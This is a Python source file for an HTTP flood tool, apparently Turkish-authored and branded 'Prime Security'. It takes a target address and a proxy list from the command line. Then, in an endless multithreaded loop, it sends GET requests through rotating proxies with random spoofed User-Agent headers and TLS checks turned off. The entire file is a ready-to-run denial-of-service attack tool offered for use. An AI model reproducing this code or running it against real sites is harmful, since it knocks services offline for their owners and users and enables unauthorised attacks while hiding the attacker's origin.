import threading
import requests
import time
import random
import argparse
import sys
import os


# Gerekli değişkenlerin tanımlanması

DEFAULT_TIMEOUT_SEC = 5
APPLICATION_VERSION = "1.1.0"
PROXY_ARRAY = []
USERAGENT_ARRAY = [
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.0",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.02",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.0",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.02",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.52",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.53",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.54",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; pl) Opera 8.54",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; da) Opera 8.54",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.0",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.01",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.02",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.52",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.54",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 9.50",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 7.60",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.0",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.00",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.01",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.02",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.52",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.53",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.54",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.24",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.26",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; es-la) Opera 9.27",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; fr) Opera 8.54",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; IT) Opera 8.0",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; pl) Opera 8.52",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; pl) Opera 8.54",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.0",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.01",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.53",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.54",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 9.52",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; sv) Opera 8.50",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; sv) Opera 8.51",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; sv) Opera 8.53",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; tr) Opera 8.50",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; en) Opera 8.50",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; en) Opera 9.27",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; en) Opera 9.50",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; ru) Opera 8.50",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; en) Opera 9.26",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; en) Opera 9.50",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; tr) Opera 10.10",
"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10",
"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.02",
"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.51",
"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.52",
"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.54",
"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 9.22",
"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 9.27",
"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; ru) Opera 8.51",
"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50",
"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.60",
"Mozilla/4.0 (compatible; MSIE 8.0; Linux i686; en) Opera 10.51",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; ko) Opera 10.53",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; en) Opera 10.62",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; de) Opera 10.62",
"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; de) Opera 11.51",
"Mozilla/5.0 (Linux i686; U; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
"Mozilla/5.0 (Macintosh; Intel Mac OS X; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.27",
"Mozilla/5.0 (Macintosh; PPC Mac OS X; U; en) Opera 8.51",
"Mozilla/5.0 (Windows 98; U; en) Opera 8.54",
"Mozilla/5.0 (Windows ME; U; en) Opera 8.51",
"Mozilla/5.0 (Windows NT 5.0; U; de) Opera 8.50",
"Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
"Mozilla/5.0 (Windows NT 5.1; U; de) Opera 8.50",
"Mozilla/5.0 (Windows NT 5.1; U; de) Opera 8.52",
"Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51",
"Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.52",
"Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
"Mozilla/5.0 (Windows NT 5.1; U; en-GB; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51",
"Mozilla/5.0 (Windows NT 5.1; U; en-GB; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.61",
"Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.0",
"Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.01",
"Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.02",
"Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.50",
"Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.51",
"Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.52",
"Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.53",
"Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.22",
"Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.24",
"Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.0) Gecko/20060728 Firefox/1.5.0 Opera 9.26",]

logo_text = f"""
 _   _ _   _         _____ _                 _ 
| | | | |_| |_ _ __ |  ___| | ___   ___   __| |
| |_| | __| __| '_ \| |_  | |/ _ \ / _ \ / _` |
|  _  | |_| |_| |_) |  _| | | (_) | (_) | (_| |
|_| |_|\__|\__| .__/|_|   |_|\___/ \___/ \__,_|
              |_|                              
 
[ * ] Version: {APPLICATION_VERSION}
[ * ] Powered By Prime Security
"""



# Gerekli fonksyionların tanımlanması

def t_debug(text:str) -> None:
    print(f"[ *DEBUG* ]: {text}.")


def t_info(text:str) -> None:
    print(f"[ *INFO* ]: {text}.")


def t_error(text:str) -> None:
    print(f"[ *ERROR* ]: {text}")


def printBanner() -> None:
    print(logo_text)
    time.sleep(1)
    

def randomUserAgent() -> str:
    return random.choice(USERAGENT_ARRAY)


printBanner()



argParser = argparse.ArgumentParser()
argParser.add_argument("--type",required=True,type=str,help="Types of proxys http or https")
argParser.add_argument("--file",required=True,type=str,help="Proxy file path")
argParser.add_argument("--target",required=True,type=str,help="Target ip addrs or domain or url")
argParser.add_argument("--thread",required=True,type=int,help="Total job/seconds ex:10")


arg_list = vars(argParser.parse_args())



# Parametrelerin alınması

PROXY_TYPE = arg_list["type"]
TARGET_ADRES = arg_list["target"]
TOTAL_THREAD = arg_list["thread"]
PROXY_FILE = arg_list["file"]



# Program içerisinde gereken değişkenlerin kontrolü

if PROXY_TYPE not in [ "http", "https"]:
    t_error("Desteklenmeyen proxy tipi, işlem iptal edildi")
    sys.exit(1)

if TOTAL_THREAD > 50:
    t_debug(f"Aşırı yüksek iş parçacığı seçildi, overload olasılığı var")

if not os.path.exists(PROXY_FILE) or not os.path.isfile(PROXY_FILE):
    t_error("Geçersiz proxy dosya konumu")
    sys.exit(1)



# Programın ana sınıfının tanımlanması

class HttpFlooder():
    def __init__(self, proxy_array, proxy_type:str):
        self.proxyArray = proxy_array
        self.proxyType = proxy_type
        
    def startFlood(self,timeOut, targetAddres):
        self.FailCounter = 0
        self.SuccessCounter = 0
        self.TotalCounter = 0
        
        t_info(f"Thread fonksiyonu hazırlanıyor")
        def thread_function(proxy_addr:str) -> None:
            self.TotalCounter += 1
            try:
                proxyies = {
                self.proxyType:proxy_addr
                }
                header = {
                "User-Agent":randomUserAgent()
                }

                req_status = requests.get(verify=False,timeout=timeOut,url=targetAddres,headers=header,proxies=proxyies)

                if not req_status.ok:
                    self.FailCounter+=1
                    return
        
                self.SuccessCounter += 1
            except Exception as err:
                self.FailCounter+=1   

        t_info(f"Devamlı döngü başlatılıyor")
        t_info("Döngü başlatıldı, çıkmak için CTRL+C kombinasyonunu kullanınız")
        while True:    
            try:
                for single_proxy in self.proxyArray:    
                    if threading.active_count() <= TOTAL_THREAD:
                        worker_thread = threading.Thread(
                            daemon=True,
                            target=thread_function,
                            args=(single_proxy,)
                        )
                        worker_thread.start()
                    else:

                        while threading.active_count() > TOTAL_THREAD:
                            time.sleep(0.5)
                            continue

                        worker_thread = threading.Thread(
                            daemon=True,
                            target=thread_function,
                            args=(single_proxy,)
                        )
                        worker_thread.start()

                    
                    print(f"[ status ] Toplam: {self.TotalCounter} Başarılı: {self.SuccessCounter} Başarısız: {self.FailCounter}\t", end="\r")


            except Exception as err:
                t_debug(f"Hata gerçekleşti devam edilecek, {err}")
                continue
            
            except KeyboardInterrupt:
                t_info("CTRL + C algılandı, program kapatılıyor")
                break
            
            






# Proxy dosyasından gerekli proxylier belleğe alınır
t_info("Proxy dosyası açılıyor")
with open(PROXY_FILE, "r") as proxyFile:
    for line in proxyFile:
        line = line.strip()
        PROXY_ARRAY.append(line)
t_info("Proxyler belleğe alındı")    


# araç sınıfı tanımlanır ve işlem başlatılır 
httpFloodToolkit = HttpFlooder(PROXY_ARRAY,PROXY_TYPE)
httpFloodToolkit.startFlood(timeOut=DEFAULT_TIMEOUT_SEC,targetAddres=TARGET_ADRES)





    
    
"""
--> CHANGE LOG <-- 


v1.0.0a 
* Temel sistam yapısı kuruldu ve ayarlandı 

v1.0.1a 
* Proxylerin tekrar kullanılması durumunda hız düşüşü fixlemek amacıyla timeout eklendi    

v1.1.1
* Thread hatası çözüldü
    
"""